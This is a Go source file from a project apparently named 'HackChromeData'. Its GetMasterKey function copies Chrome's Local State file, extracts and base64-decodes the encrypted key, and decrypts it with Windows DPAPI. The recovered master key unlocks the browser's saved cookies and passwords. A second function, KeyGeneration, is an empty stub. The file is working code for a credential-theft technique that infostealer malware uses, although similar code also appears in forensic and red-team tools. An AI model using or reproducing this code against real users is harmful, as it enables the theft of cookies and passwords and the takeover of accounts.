package masterkey

import (
	"encoding/base64"
	"fmt"
	"os"

	"github.com/tidwall/gjson"
	"github.com/ultra-supara/cookie/HackChromeData/decrypter"
	"github.com/ultra-supara/cookie/HackChromeData/util"
)

func GetMasterKey(filepath string) ([]byte, error) {
	keyFile := "./key"
	err := util.FileCopy(filepath, keyFile)
	if err != nil {
		return nil, fmt.Errorf("FileCopy failed: %w", err)
	}
	defer os.Remove(keyFile)
	j, err := os.ReadFile(keyFile)
	if err != nil {
		return nil, fmt.Errorf("Failed to open the copied local state file: %w", err)
	}
	encryptedKey := gjson.Get(string(j), "os_crypt.encrypted_key")
	if encryptedKey.Exists() {
		pureKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
		if err != nil {
			return nil, err
		}
		masterKey, err := decrypter.DPApi(pureKey[5:])
		return masterKey, err
	}
	return nil, nil
}

func KeyGeneration(seed []byte) ([]byte, error) {
	return nil, nil
}
